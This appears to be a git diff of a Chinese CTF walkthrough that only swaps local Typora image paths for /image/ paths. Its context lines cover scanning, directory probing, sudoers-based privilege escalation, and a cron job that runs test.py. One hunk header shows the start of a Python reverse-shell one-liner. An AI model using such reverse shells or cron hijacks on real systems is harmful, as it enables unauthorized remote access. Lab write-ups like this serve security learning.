@@ -23,7 +23,7 @@ PORT     STATE    SERVICE          REASON      VERSION
 
 ### 访问下80端口
 
-![image-20230501152755513](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501152755513.png)
+![image-20230501152755513](/image/image-20230501152755513.png)
 
 ## 目录探测
 
@@ -60,15 +60,15 @@ Progress: 959 / 960 (99.90%)
 
 ### 访问下/dev
 
-![image-20230501153106883](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501153106883.png)
+![image-20230501153106883](/image/image-20230501153106883.png)
 
-![image-20230501153207799](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501153207799.png)
+![image-20230501153207799](/image/image-20230501153207799.png)
 
 ### 获得了user的flag，尝试进一步提权到root
 
 ## 权限提升
 
-![image-20230501153250145](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501153250145.png)
+![image-20230501153250145](/image/image-20230501153250145.png)
 
 ### 补充一点关于sudoers文件的知识
 
@@ -131,6 +131,7 @@ echo 'import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 
 ### 再次将反弹shell的命令写test.py，同时监听12345端口，看看等下能不能收到shell。
 
-![image-20230501180811085](C:\Users\root\AppData\Roaming\Typora\typora-user-images\image-20230501180811085.png)
+![image-20230501180811085](/image/image-20230501180811085.png)
 
 ### 看了下计划任务，果然定时执行test.py文件。
+
